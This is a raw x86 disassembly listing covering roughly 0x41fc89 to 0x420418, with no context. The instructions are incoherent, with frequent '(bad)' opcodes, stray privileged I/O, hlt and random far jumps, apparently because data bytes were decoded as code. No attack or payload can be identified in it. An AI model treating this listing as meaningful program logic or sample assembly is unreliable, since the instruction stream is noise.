  41fc89:	outs   dx,DWORD PTR ds:[esi]
  41fc8a:	rcl    ecx,1
  41fc8c:	fnsave [edx]
  41fc8e:	(bad)  
  41fc8f:	pop    ebp
  41fc90:	out    0x3d,eax
  41fc92:	pop    edi
  41fc93:	mov    cs,WORD PTR [esi]
  41fc95:	nop
  41fc96:	and    BYTE PTR [edx],0x86
  41fc99:	cld    
  41fc9a:	or     al,0x99
  41fc9c:	aam    0xb6
  41fc9e:	push   ebp
  41fc9f:	call   0x457c:0x65ad2198
  41fca6:	push   ebx
  41fca7:	test   eax,0xae98639
  41fcac:	add    DWORD PTR [edx+0x51],0x2902058a
  41fcb3:	fdivr  DWORD PTR [eax-0x38]
  41fcb6:	push   ecx
  41fcb7:	add    eax,0x51ed12b6
  41fcbc:	sbb    BYTE PTR [ebp-0x29c40290],bl
  41fcc2:	sub    dl,cl
  41fcc4:	push   0xd7a0bbf7
  41fcc9:	or     ebp,DWORD PTR [ebp+0x47]
  41fccc:	push   esi
  41fccd:	and    BYTE PTR [ecx+0x1],al
  41fcd0:	rol    dl,cl
  41fcd2:	das    
  41fcd3:	push   ss
  41fcd4:	inc    ebx
  41fcd5:	inc    esi
  41fcd6:	push   ebp
  41fcd7:	mov    al,ds:0x6ace77dd
  41fcdc:	imul   DWORD PTR [edx+eiz*8-0x1bd70600]
  41fce3:	imul   ebp,edx,0x173846e7
  41fce9:	and    al,0x9c
  41fceb:	(bad)  
  41fcec:	(bad)  
  41fced:	jns    0x41fcb1
  41fcef:	mov    eax,0xd0254ba6
  41fcf4:	jb     0x41fd06
  41fcf6:	nop
  41fcf7:	loop   0x41fd56
  41fcf9:	mov    cl,0x58
  41fcfb:	jl     0x41fd6f
  41fcfd:	cmc    
  41fcfe:	faddp  st(1),st
  41fd00:	call   0x5e271750
  41fd05:	push   esp
  41fd06:	push   ss
  41fd07:	fild   WORD PTR [ebp-0x3e72a100]
  41fd0d:	mov    bh,0xb0
  41fd0f:	iret   
  41fd10:	adc    BYTE PTR [ebp-0x507df17b],ah
  41fd16:	and    dh,BYTE PTR [ebx]
  41fd18:	mov    eax,0xdcdcb509
  41fd1d:	iret   
  41fd1e:	and    al,0xb0
  41fd20:	pop    edi
  41fd21:	stos   DWORD PTR es:[edi],eax
  41fd22:	pop    ebx
  41fd23:	les    edx,FWORD PTR [edi-0x4efa1b61]
  41fd29:	fdiv   DWORD PTR [ebx-0x63997af8]
  41fd2f:	jle    0x41fd55
  41fd31:	arpl   dx,ax
  41fd33:	loope  0x41fd0f
  41fd35:	(bad)  [esi+0x43dee2b3]
  41fd3b:	ror    DWORD PTR [eax+esi*8-0x51],cl
  41fd3f:	cwde   
  41fd40:	jg     0x41fd3b
  41fd42:	lds    esp,FWORD PTR [ebp-0x74]
  41fd45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd46:	inc    ebx
  41fd47:	jo     0x41fdbb
  41fd49:	inc    edx
  41fd4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd4c:	xchg   ecx,eax
  41fd4d:	cmp    BYTE PTR fs:[eax-0x1cceaf39],bh
  41fd54:	ja     0x41fd9e
  41fd56:	inc    ebx
  41fd57:	gs in  eax,dx
  41fd59:	and    DWORD PTR [ebx+0x3c],0xffffffb8
  41fd5d:	fnstsw ax
  41fd5f:	push   ss
  41fd60:	pop    esp
  41fd61:	stos   DWORD PTR es:[edi],eax
  41fd62:	xchg   bl,dl
  41fd64:	xchg   esp,eax
  41fd65:	lods   al,BYTE PTR ds:[esi]
  41fd66:	cmp    eax,0xf6ce8951
  41fd6b:	test   eax,0xcb78d848
  41fd70:	xor    al,0x7a
  41fd72:	hlt    
  41fd73:	adc    bh,0x2
  41fd76:	cli    
  41fd77:	add    esi,DWORD PTR [edi+0x397deaa4]
  41fd7d:	ret    
  41fd7e:	xchg   ebp,eax
  41fd7f:	sub    eax,eax
  41fd81:	inc    ebx
  41fd82:	bound  esi,QWORD PTR [esi]
  41fd84:	ds fwait
  41fd86:	mov    al,ds:0x637a5d66
  41fd8b:	mov    eax,ds:0x9052f709
  41fd90:	in     al,dx
  41fd91:	inc    ecx
  41fd92:	icebp  
  41fd93:	mov    DWORD PTR [ebx+0x1dcdac65],0x29944a7b
  41fd9d:	dec    ebp
  41fd9e:	and    ah,dh
  41fda0:	mov    esi,0xa179c309
  41fda5:	stos   BYTE PTR es:[edi],al
  41fda6:	loope  0x41fdd2
  41fda8:	or     BYTE PTR [edx+0x41],bl
  41fdab:	sbb    eax,0x5e1926db
  41fdb0:	out    0x95,eax
  41fdb2:	scas   eax,DWORD PTR es:[edi]
  41fdb3:	iret   
  41fdb4:	test   eax,0xf682b31b
  41fdb9:	mov    ecx,ebp
  41fdbb:	mov    ecx,0xd1a6696d
  41fdc0:	sbb    BYTE PTR [edx],bh
  41fdc2:	inc    ebp
  41fdc3:	dec    eax
  41fdc4:	push   eax
  41fdc5:	and    al,0x2d
  41fdc7:	repz enter 0x59b,0x39
  41fdcc:	fmul   DWORD PTR [edi+0x29]
  41fdcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdd0:	jg     0x41fe3a
  41fdd2:	stos   DWORD PTR es:[edi],eax
  41fdd3:	repz fmul QWORD PTR [edx]
  41fdd6:	popf   
  41fdd7:	repnz xchg edx,eax
  41fdd9:	sub    BYTE PTR [ebx],0x82
  41fddc:	mov    ds,WORD PTR [ebx-0x1e]
  41fddf:	add    eax,DWORD PTR [esi]
  41fde1:	lock push es
  41fde3:	neg    DWORD PTR [edi+0x58a8a9ca]
  41fde9:	dec    esi
  41fdea:	sub    BYTE PTR [eax],bl
  41fdec:	enter  0xaf61,0xad
  41fdf0:	lahf   
  41fdf1:	cmp    DWORD PTR [ecx],esp
  41fdf3:	or     BYTE PTR [ecx-0x3b],bh
  41fdf6:	gs sub al,0x1b
  41fdf9:	mov    cl,0x9a
  41fdfb:	jae    0x41fdca
  41fdfd:	jp     0x41fdf6
  41fdff:	mov    ah,0x19
  41fe01:	stc    
  41fe02:	jecxz  0x41fe1f
  41fe04:	(bad)  
  41fe05:	lock sub al,0x54
  41fe08:	mov    esi,esi
  41fe0a:	rcl    DWORD PTR [eax+0x43],cl
  41fe0d:	fisttp QWORD PTR [eax]
  41fe0f:	pop    esp
  41fe10:	pushf  
  41fe11:	call   0x2396fac4
  41fe16:	and    BYTE PTR [eax+0x1],bh
  41fe19:	mov    WORD PTR [eax-0x7649ebc0],gs
  41fe1f:	repnz pop esp
  41fe21:	in     eax,dx
  41fe22:	in     eax,dx
  41fe23:	ror    BYTE PTR [ecx+0xeacbe94],1
  41fe29:	inc    eax
  41fe2a:	and    esp,DWORD PTR [ebp-0x7946d315]
  41fe30:	inc    ecx
  41fe31:	xor    BYTE PTR [ecx-0x1cebda45],al
  41fe37:	bnd jg 0x41fddf
  41fe3a:	(bad)  
  41fe3b:	cmc    
  41fe3c:	rol    BYTE PTR [ecx],0xc3
  41fe3f:	into   
  41fe40:	xor    ebp,DWORD PTR [ebx+0x484b844c]
  41fe46:	enter  0x8714,0x29
  41fe4a:	fnstsw WORD PTR [ebp+0x26]
  41fe4d:	cmp    eax,0xfd50e345
  41fe52:	rcr    ah,0x50
  41fe55:	push   0x3a
  41fe57:	xor    eax,0x9c2e48ef
  41fe5c:	test   BYTE PTR [ecx],dl
  41fe5e:	shl    DWORD PTR [edx],cl
  41fe60:	mov    bh,BYTE PTR [esi-0x78]
  41fe63:	push   edi
  41fe64:	in     eax,0x28
  41fe66:	mov    ch,0xbf
  41fe68:	repnz mov BYTE PTR [esi+0x31],bl
  41fe6c:	das    
  41fe6d:	fstp   DWORD PTR [ebx-0x7e17ed75]
  41fe73:	add    bl,BYTE PTR [esi+ecx*1+0x67]
  41fe77:	test   eax,ebp
  41fe79:	in     al,dx
  41fe7a:	jns    0x41fef1
  41fe7c:	push   esi
  41fe7d:	ins    DWORD PTR es:[edi],dx
  41fe7e:	mov    cl,0x37
  41fe80:	test   al,0xa1
  41fe82:	iret   
  41fe83:	adc    al,0xcd
  41fe85:	nop
  41fe86:	test   ch,ch
  41fe88:	sahf   
  41fe89:	call   0x14c743ef
  41fe8e:	sti    
  41fe8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe90:	cmp    eax,eax
  41fe92:	xchg   ebx,eax
  41fe93:	adc    esp,ecx
  41fe95:	fld    DWORD PTR [eax+0x4b99b4d2]
  41fe9b:	fdiv   DWORD PTR [ecx-0x20]
  41fe9e:	je     0x41fe5b
  41fea0:	dec    ecx
  41fea1:	mov    BYTE PTR [ecx-0x6],dl
  41fea4:	pop    edi
  41fea5:	sar    DWORD PTR [ebp-0x3d],1
  41fea8:	mov    DWORD PTR [edi-0x3bdd613a],eax
  41feae:	cmp    BYTE PTR [eax],bh
  41feb0:	cmp    eax,0x964284d1
  41feb5:	mov    dl,BYTE PTR [edx-0x4a]
  41feb8:	jb     0x41fef3
  41feba:	sbb    BYTE PTR ds:0x1262cbd3,ah
  41fec0:	in     eax,dx
  41fec1:	adc    eax,0x7aea8e12
  41fec6:	mov    al,0x12
  41fec8:	cmp    esi,DWORD PTR ds:0xd93d33d3
  41fece:	push   eax
  41fed0:	neg    DWORD PTR [edi+0x70]
  41fed3:	cld    
  41fed4:	push   cs
  41fed5:	cmc    
  41fed6:	or     edx,DWORD PTR [edi-0x26]
  41fed9:	repz fwait
  41fedb:	imul   esp,edi,0x54266582
  41fee1:	sub    DWORD PTR [ecx+ecx*1],esp
  41fee4:	sbb    al,0x5f
  41fee6:	xor    bh,ch
  41fee8:	leave  
  41fee9:	mov    dl,0x28
  41feeb:	pop    esp
  41feec:	sahf   
  41feed:	jns    0x41ff30
  41feef:	lock lock hlt 
  41fef2:	pop    eax
  41fef3:	fadd   st,st(1)
  41fef5:	out    dx,eax
  41fef6:	es loope 0x41fe8f
  41fef9:	sub    eax,0xc795a820
  41fefe:	fadd   DWORD PTR [edi+0x29fe248f]
  41ff04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff05:	call   0xc206:0x7951eb8a
  41ff0c:	and    DWORD PTR [ebx],ebp
  41ff0e:	lahf   
  41ff0f:	push   ss
  41ff10:	scas   al,BYTE PTR es:[edi]
  41ff11:	rcr    BYTE PTR [ebx+edx*1],cl
  41ff14:	mov    BYTE PTR [edx+0x5295321d],bl
  41ff1a:	jge    0x41fee7
  41ff1c:	lds    ebp,FWORD PTR [ecx-0x706487f0]
  41ff22:	arpl   ax,cx
  41ff24:	mov    eax,0x1af31eb1
  41ff29:	fs leave 
  41ff2b:	aam    0x7e
  41ff2d:	dec    ebx
  41ff2e:	shl    BYTE PTR [edx+0x5f],cl
  41ff31:	nop
  41ff32:	loopne 0x41ff09
  41ff34:	or     BYTE PTR ds:0x5dc2d5d7,bh
  41ff3a:	ret    0x2924
  41ff3d:	mov    esp,0x574f2c73
  41ff42:	aad    0x91
  41ff44:	pop    edi
  41ff45:	in     eax,0x24
  41ff47:	loopne 0x41feda
  41ff49:	in     eax,dx
  41ff4a:	xor    DWORD PTR [edi],0xc748c9d
  41ff50:	popa   
  41ff51:	and    BYTE PTR [edi+0x211e9180],0xc3
  41ff58:	outs   dx,BYTE PTR ds:[esi]
  41ff59:	jge    0x41ff90
  41ff5b:	sbb    BYTE PTR [ebx-0x38872eff],dl
  41ff61:	lods   al,BYTE PTR ds:[esi]
  41ff62:	push   cs
  41ff63:	dec    esi
  41ff64:	frstor [edi]
  41ff66:	enter  0x17a,0x54
  41ff6a:	or     edx,ebp
  41ff6c:	adc    ah,cl
  41ff6e:	adc    BYTE PTR [ecx],ch
  41ff70:	push   ebx
  41ff71:	or     ch,ah
  41ff73:	test   al,0x17
  41ff75:	jecxz  0x41ff3f
  41ff77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff78:	loope  0x41ff0f
  41ff7a:	jae    0x41ff2d
  41ff7c:	shr    BYTE PTR [ebp-0xdba78f0],1
  41ff82:	loope  0x41fffb
  41ff84:	test   BYTE PTR [ebx],dh
  41ff86:	dec    ecx
  41ff87:	sub    BYTE PTR [ecx+0x29dd58e8],bl
  41ff8d:	xor    eax,0xf1f776e0
  41ff92:	cmp    bh,BYTE PTR [ebx]
  41ff94:	icebp  
  41ff95:	sub    ah,BYTE PTR [ecx]
  41ff97:	or     edi,ecx
  41ff99:	rol    DWORD PTR [ebx+0x10f90a9d],0x55
  41ffa0:	std    
  41ffa1:	das    
  41ffa2:	fwait
  41ffa3:	add    BYTE PTR [ecx+0x1263ab1f],bl
  41ffa9:	mov    eax,0xeb68eb57
  41ffae:	paddusb mm3,QWORD PTR ds:0xa7a5e1d0
  41ffb5:	jg     0x41fffd
  41ffb7:	xchg   edi,eax
  41ffb8:	xor    eax,0xd3c02225
  41ffbd:	or     edx,DWORD PTR [edx+0x5c]
  41ffc0:	aad    0x6e
  41ffc2:	and    DWORD PTR [esi],ebp
  41ffc4:	or     dl,BYTE PTR [eax+0x78bf4042]
  41ffca:	xlat   BYTE PTR ds:[ebx]
  41ffcb:	mov    ds,WORD PTR [ebp-0x68]
  41ffce:	sahf   
  41ffcf:	add    dh,BYTE PTR [ecx]
  41ffd1:	repnz xor ebp,esi
  41ffd4:	or     ax,WORD PTR [esi]
  41ffd7:	push   eax
  41ffd8:	jae    0x41ff69
  41ffda:	aad    0xb6
  41ffdc:	sbb    al,0x1d
  41ffde:	xor    ecx,ecx
  41ffe0:	jp     0x41ffa9
  41ffe2:	push   ebp
  41ffe3:	outs   dx,DWORD PTR ds:[esi]
  41ffe4:	cmp    bh,dh
  41ffe6:	sub    eax,0xae89c9a4
  41ffeb:	xchg   edi,eax
  41ffec:	fs pop esp
  41ffee:	or     esp,DWORD PTR [eax+0x9]
  41fff1:	dec    ebp
  41fff2:	push   ss
  41fff3:	aaa    
  41fff4:	mov    ds:0x48957b98,al
  41fff9:	stos   DWORD PTR es:[edi],eax
  41fffa:	int    0x2b
  41fffc:	mov    edi,0x24f08cf0
  420001:	daa    
  420002:	repnz and BYTE PTR [eax-0x7d8dc27a],ch
  420009:	dec    ebx
  42000a:	in     eax,dx
  42000b:	imul   ecx,ecx,0x6ae25e9d
  420011:	dec    edx
  420012:	jns    0x41ffd5
  420014:	cwde   
  420015:	mov    eax,ds:0xeb00ccc
  42001a:	and    eax,0x71cf30b0
  42001f:	cdq    
  420020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420021:	retf   0x8d73
  420024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420025:	push   edx
  420026:	es push es
  420028:	cwde   
  420029:	(bad)  
  42002a:	lock std 
  42002c:	pop    edx
  42002d:	daa    
  42002e:	ss sub al,0x2c
  420031:	inc    edi
  420032:	fxch   st(3)
  420034:	mov    WORD PTR [esi+ebx*4],ss
  420037:	das    
  420038:	jle    0x420002
  42003a:	icebp  
  42003b:	ror    DWORD PTR [esi-0x6d55d6b5],0xa8
  420042:	dec    ebp
  420043:	dec    ebx
  420044:	pop    eax
  420045:	pop    ecx
  420046:	jne    0x42005d
  420048:	(bad)  
  420049:	in     al,dx
  42004a:	not    edi
  42004c:	sbb    al,0x90
  42004e:	sub    bl,BYTE PTR [esi+ebp*4]
  420051:	jp     0x42004c
  420053:	bound  ecx,QWORD PTR [ecx+0x29]
  420056:	lods   eax,DWORD PTR ds:[esi]
  420057:	fcmovnbe st,st(5)
  420059:	adc    esi,DWORD PTR [eax]
  42005b:	push   esi
  42005c:	sbb    DWORD PTR [eax],ecx
  42005e:	mov    bh,0x76
  420060:	sbb    eax,0xaf7200fb
  420065:	sti    
  420066:	mov    ecx,?
  420068:	stos   BYTE PTR es:[edi],al
  420069:	mov    ecx,0x652c9385
  42006e:	pop    ds
  42006f:	sub    al,0x38
  420071:	dec    ecx
  420072:	inc    ecx
  420073:	cmp    DWORD PTR [ebx],eax
  420075:	fcomip st,st(6)
  420077:	pop    ebx
  420078:	push   esi
  420079:	mov    cl,BYTE PTR [ebx]
  42007b:	push   es
  42007c:	js     0x42003a
  42007e:	loop   0x420075
  420080:	mov    bh,0x98
  420082:	fld    DWORD PTR [ebp+0x53b44878]
  420088:	fs inc ebx
  42008a:	mov    al,0x3c
  42008c:	out    dx,al
  42008d:	nop
  42008e:	mov    WORD PTR [ebp+ecx*4+0x22],fs
  420092:	jmp    0x9ad4:0x96757c5a
  420099:	sub    dl,BYTE PTR [ecx+0x57]
  42009c:	popf   
  42009d:	stos   BYTE PTR es:[edi],al
  42009e:	sub    al,BYTE PTR [ebx-0x2e]
  4200a1:	sti    
  4200a2:	xor    bl,BYTE PTR [eax+0x2d]
  4200a5:	push   edx
  4200a6:	call   0x4238:0xe4d318c
  4200ad:	jmp    0x420068
  4200af:	bound  eax,QWORD PTR [ebp-0x2]
  4200b2:	dec    edi
  4200b3:	pop    ebp
  4200b4:	mov    cl,0xc7
  4200b6:	cmp    BYTE PTR [eax],bl
  4200b8:	add    ecx,ebx
  4200ba:	sub    esi,DWORD PTR [edx-0x7c]
  4200bd:	mov    eax,ds:0xe16a8458
  4200c2:	or     BYTE PTR [ebx],0x8a
  4200c5:	pop    ecx
  4200c6:	das    
  4200c7:	mov    ecx,0x9ad361c9
  4200cc:	cmp    eax,0xf0a1bc86
  4200d1:	adc    eax,0xd967bc7
  4200d6:	xchg   ebx,eax
  4200d7:	stc    
  4200d8:	pop    ds
  4200d9:	lds    edx,FWORD PTR [edx]
  4200db:	(bad)  
  4200dd:	xchg   edi,eax
  4200de:	jp     0x4200d3
  4200e0:	dec    eax
  4200e1:	jnp    0x42009a
  4200e3:	cmp    DWORD PTR [eax-0x69],ebp
  4200e6:	xchg   esi,eax
  4200e7:	mov    esp,ecx
  4200e9:	push   ecx
  4200ea:	push   ebx
  4200eb:	sbb    DWORD PTR [eax+0x1b],0x4f
  4200ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f0:	cld    
  4200f1:	push   ss
  4200f2:	or     al,0x60
  4200f4:	xor    al,0xe3
  4200f6:	sar    DWORD PTR [eax-0x60],cl
  4200f9:	sahf   
  4200fa:	nop
  4200fb:	enter  0x40a3,0xe
  4200ff:	sbb    ebp,DWORD PTR [eax+0x58]
  420102:	outs   dx,DWORD PTR ds:[esi]
  420103:	mov    BYTE PTR [eax],0x28
  420106:	cli    
  420107:	outs   dx,BYTE PTR ds:[esi]
  420108:	int    0xf7
  42010a:	in     al,dx
  42010b:	mov    es:0xe89cfa2b,eax
  420111:	sub    cl,BYTE PTR [edx+ebp*8-0x1b]
  420115:	pop    ecx
  420116:	inc    ebp
  420117:	jp     0x42014e
  420119:	jnp    0x420141
  42011b:	jno    0x420163
  42011d:	sub    DWORD PTR [ebx],ebx
  42011f:	mov    eax,ds:0xbb384884
  420124:	inc    ebx
  420125:	xchg   ebx,eax
  420126:	adc    dl,BYTE PTR [edi+edi*1-0x1a1e84d5]
  42012d:	rcr    BYTE PTR [ebx-0x4f],cl
  420130:	test   DWORD PTR [ebx-0x4c580509],0x28766c83
  42013a:	push   eax
  42013b:	jmp    FWORD PTR [edx-0x44]
  42013e:	fs jp  0x420132
  420141:	mov    ebx,0xd7623161
  420146:	lods   al,BYTE PTR ds:[esi]
  420147:	je     0x420122
  420149:	mov    ds:0x6b59b19b,al
  42014e:	into   
  42014f:	cli    
  420150:	push   0x1c99364a
  420155:	mov    es,ebx
  420157:	xlat   BYTE PTR ds:[ebx]
  420158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420159:	aas    
  42015a:	sub    DWORD PTR [ebx+0x1],edx
  42015d:	(bad)  [ecx-0x4d3f26e3]
  420163:	retf   
  420164:	pop    ebx
  420165:	adc    cl,0x28
  420168:	cmp    BYTE PTR [eax+0x30],bh
  42016b:	inc    ebx
  42016c:	add    ah,bl
  42016e:	push   es
  42016f:	and    edi,DWORD PTR [edx+0x5a]
  420172:	xchg   ebp,eax
  420173:	jbe    0x4201ac
  420175:	es mov ah,0x7b
  420178:	sbb    dh,BYTE PTR [ebx-0x47]
  42017b:	out    0x15,eax
  42017d:	cld    
  42017e:	inc    ebx
  42017f:	or     ecx,DWORD PTR [ecx+0x26421deb]
  420185:	push   es
  420186:	sbb    edi,ebx
  420188:	inc    ebp
  420189:	push   es
  42018a:	imul   ebx,DWORD PTR [edx+0x97da2f],0x860b7972
  420194:	xor    eax,0x611868e3
  420199:	adc    esp,eax
  42019b:	shrd   DWORD PTR [esi+0x218b43d5],edx,cl
  4201a2:	dec    ecx
  4201a3:	pop    ecx
  4201a4:	jnp    0x4201d6
  4201a6:	sar    BYTE PTR [edx],0x9c
  4201a9:	jo     0x42013f
  4201ab:	mov    bh,0xca
  4201ad:	xchg   edi,eax
  4201ae:	mov    esi,edi
  4201b0:	sbb    BYTE PTR cs:[ebx+0x7d146bbd],bh
  4201b7:	cmp    al,0x84
  4201b9:	lods   al,BYTE PTR ds:[esi]
  4201ba:	or     DWORD PTR [edi+0x71],edx
  4201bd:	mov    cl,0x7c
  4201bf:	fadd   DWORD PTR [ebx-0x3c]
  4201c2:	pop    ebp
  4201c3:	cmp    DWORD PTR [edi-0x14],ebx
  4201c6:	clc    
  4201c7:	fnstsw WORD PTR [eax]
  4201c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201ca:	dec    edi
  4201cb:	pop    edi
  4201cc:	call   0x8bc0:0xeb98d91c
  4201d3:	ss out dx,al
  4201d5:	mov    edi,0x5cea6ac7
  4201da:	pop    esp
  4201db:	push   0xa
  4201dd:	shr    BYTE PTR [ebp-0x7b5f9ef2],1
  4201e3:	outs   dx,BYTE PTR ds:[esi]
  4201e4:	out    0x48,al
  4201e6:	xor    DWORD PTR [ecx-0x241d5102],esi
  4201ec:	ins    BYTE PTR es:[edi],dx
  4201ed:	fdiv   st,st(4)
  4201ef:	out    0x4d,eax
  4201f1:	cld    
  4201f2:	bnd jg 0x4201a7
  4201f5:	fdivr  DWORD PTR [ecx+0x4f]
  4201f8:	sub    DWORD PTR [edx+0x65f01358],0xffffffe4
  4201ff:	sub    al,0x24
  420201:	std    
  420202:	push   0xffffffac
  420204:	pop    edi
  420205:	push   esi
  420206:	pushf  
  420207:	xor    ebx,ebx
  420209:	mov    esi,0xec3180e9
  42020e:	out    dx,eax
  42020f:	jo     0x4201f1
  420211:	jmp    0x50aa:0x62f298de
  420218:	shr    BYTE PTR [eax-0x16f6a3c0],0x79
  42021f:	dec    ebx
  420220:	aam    0xa2
  420222:	add    DWORD PTR [eax+edi*1-0x77],edx
  420226:	aas    
  420227:	out    0xe5,eax
  420229:	js     0x42029b
  42022b:	and    cl,al
  42022d:	test   al,0xb4
  42022f:	dec    edi
  420230:	pushf  
  420231:	mov    esi,0x7baf468c
  420236:	stos   DWORD PTR es:[edi],eax
  420237:	fs adc eax,0xf412845c
  42023d:	jmp    0xd2003d2b
  420242:	adc    BYTE PTR [eax-0x4f6a6079],dh
  420248:	mov    esi,0xf5efbc68
  42024d:	les    edi,FWORD PTR [esi]
  42024f:	adc    al,0xed
  420251:	push   ebx
  420252:	pop    esi
  420253:	add    al,0xbc
  420255:	xchg   ebx,eax
  420256:	mov    edx,0xcc79c72d
  42025b:	and    DWORD PTR [eax-0x95c8581],edx
  420261:	pushf  
  420262:	lds    edi,FWORD PTR [edx+0x26f333e8]
  420268:	enter  0x7ac2,0xa6
  42026c:	adc    ecx,ecx
  42026e:	imul   edx,DWORD PTR [esi],0x9b225b7d
  420274:	icebp  
  420275:	mov    ah,0xf2
  420277:	(bad)  
  420278:	(bad)  [eax+edx*4-0xa]
  42027c:	pop    esp
  42027d:	enter  0x49b,0xf9
  420281:	in     al,dx
  420282:	fstp   QWORD PTR [edi-0x5c]
  420285:	and    ecx,edi
  420287:	rol    DWORD PTR [edi+ebp*2+0x3c5bd244],1
  42028e:	enter  0x346e,0x3f
  420292:	adc    eax,0x7bd445b1
  420297:	xchg   esp,eax
  420298:	pop    ss
  420299:	inc    edx
  42029a:	mov    al,0x1c
  42029c:	push   edi
  42029d:	add    eax,0x43fef64d
  4202a2:	xchg   ecx,eax
  4202a3:	test   BYTE PTR [ebp-0x4],bl
  4202a6:	iret   
  4202a7:	aaa    
  4202a8:	idiv   DWORD PTR [ecx]
  4202aa:	loopne 0x4202af
  4202ac:	lods   eax,DWORD PTR ds:[esi]
  4202ad:	retf   0x302c
  4202b0:	sbb    dh,dh
  4202b2:	adc    BYTE PTR [edi],al
  4202b4:	jmp    0x2447:0xf44c1848
  4202bb:	rcr    BYTE PTR [ecx+ebx*4],0x6b
  4202bf:	adc    ch,BYTE PTR [esi+ebx*8+0x6d]
  4202c3:	adc    BYTE PTR [eax],cl
  4202c5:	out    dx,al
  4202c6:	jmp    0x4202bd
  4202c8:	imul   eax,eax,0x5d
  4202cb:	and    esi,esi
  4202cd:	add    edi,edi
  4202cf:	mov    ds:0x2872feb6,al
  4202d4:	ins    DWORD PTR es:[edi],dx
  4202d5:	jnp    0x420324
  4202d7:	push   es
  4202d8:	sub    ebp,ebx
  4202da:	jne    0x420267
  4202dc:	jmp    0x659490dd
  4202e1:	sbb    al,0x9f
  4202e3:	add    bh,BYTE PTR [ecx+eiz*2]
  4202e6:	ss sbb eax,ecx
  4202e9:	add    al,0x6f
  4202eb:	jge    0x4202c6
  4202ed:	repz gs xor eax,0xfd6f385e
  4202f4:	call   0x1fa84ee1
  4202f9:	mov    WORD PTR [ebx+0x40],?
  4202fc:	aaa    
  4202fd:	xor    edi,DWORD PTR [edi+0x7]
  420300:	sub    DWORD PTR [ecx-0x64bf5f40],ebp
  420306:	lock add ah,BYTE PTR ds:0x62038f8
  42030d:	test   DWORD PTR [ecx*4-0x3d0bca2d],ecx
  420314:	mov    edi,0x79bc32b9
  420319:	xor    al,0x53
  42031b:	jmp    0xe34bdfc4
  420320:	adc    BYTE PTR [ecx+0x48],0xe4
  420324:	add    al,BYTE PTR [ebx-0x2aed0d4f]
  42032a:	(bad)  
  42032b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42032c:	inc    edi
  42032d:	adc    BYTE PTR [edi],cl
  42032f:	and    edx,esp
  420331:	mov    dh,0xdf
  420333:	clc    
  420334:	xlat   BYTE PTR ds:[ebx]
  420335:	and    DWORD PTR [ebx-0x4e],eax
  420338:	push   cs
  420339:	inc    ebx
  42033a:	xchg   ebx,eax
  42033b:	cs pop ebx
  42033d:	int3   
  42033e:	sbb    al,BYTE PTR [edx]
  420340:	mov    DWORD PTR [edx-0x7add7aad],ebx
  420346:	je     0x4202d2
  420348:	inc    ebp
  420349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42034a:	or     cl,BYTE PTR [edi-0x16]
  42034d:	repz and eax,0xd9e21eeb
  420353:	adc    BYTE PTR [edx+0x22],dl
  420356:	sub    BYTE PTR [ebp-0x52],0x3b
  42035a:	sbb    eax,0xe2f40ad6
  42035f:	retf   
  420360:	cmp    eax,0x9ea663b3
  420365:	pop    eax
  420366:	enter  0x3309,0x9e
  42036a:	dec    ecx
  42036b:	out    0x53,eax
  42036d:	retf   0x74de
  420370:	jo     0x420394
  420372:	jmp    0x72b3:0xd474af5
  420379:	cli    
  42037a:	pcmpeqw mm0,QWORD PTR [ebx+0x8f3c0f7]
  420381:	push   ebx
  420382:	pop    eax
  420383:	adc    esp,DWORD PTR [eax+0x454cdc2c]
  420389:	cmp    al,0x77
  42038b:	add    al,0x58
  42038d:	outs   dx,DWORD PTR ds:[esi]
  42038e:	add    dl,BYTE PTR cs:0x20eec25a
  420395:	es cs jecxz 0x42036c
  420399:	xchg   esp,eax
  42039a:	push   0xabce88b5
  42039f:	xor    ebp,0xffffffcd
  4203a2:	xchg   edi,eax
  4203a3:	mov    esi,esp
  4203a5:	sbb    BYTE PTR [ebx+eax*8-0x20],dl
  4203a9:	mov    ah,0xa8
  4203ab:	add    DWORD PTR [edi+ecx*2+0x3f],edx
  4203af:	rcr    BYTE PTR [ebp+0x448ccd41],0x25
  4203b6:	sub    BYTE PTR [esi-0x54],ch
  4203b9:	mov    DWORD PTR [ebp-0x11],0xf99445eb
  4203c0:	aad    0xca
  4203c2:	repz sbb al,0xe0
  4203c5:	push   ebx
  4203c6:	cwde   
  4203c7:	popf   
  4203c8:	retf   0x4a38
  4203cb:	stos   BYTE PTR es:[edi],al
  4203cc:	push   edx
  4203cd:	shl    BYTE PTR [esi+0x62],cl
  4203d0:	adc    eax,eax
  4203d2:	mov    ch,0xcf
  4203d4:	inc    ecx
  4203d5:	add    esp,eax
  4203d7:	pop    edx
  4203d8:	(bad)  
  4203d9:	call   0xafe96cc2
  4203de:	js     0x420362
  4203e0:	cwde   
  4203e1:	pop    esp
  4203e2:	or     ebp,DWORD PTR [eax+0x4f]
  4203e5:	xchg   ebp,eax
  4203e6:	xlat   BYTE PTR ds:[ebx]
  4203e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203e8:	push   DWORD PTR [edi]
  4203ea:	enter  0xa6bb,0x9a
  4203ee:	dec    ebp
  4203ef:	xchg   esi,eax
  4203f0:	out    0x77,eax
  4203f2:	mov    dh,al
  4203f4:	xor    cl,BYTE PTR [ecx-0x5febb936]
  4203fa:	shl    al,cl
  4203fc:	or     al,0x73
  4203fe:	fadd   DWORD PTR [eax+0x22]
  420401:	(bad)  
  420402:	push   esp
  420403:	fcmove st,st(3)
  420405:	xor    al,0xdf
  420407:	sub    DWORD PTR [eax-0x48e5649f],ebx
  42040d:	push   cs
  42040e:	out    0xb4,eax
  420410:	jne    0x4203a6
  420412:	inc    eax
  420413:	xor    eax,0xc1fc4024
  420418:	and    eax,0x6309984d
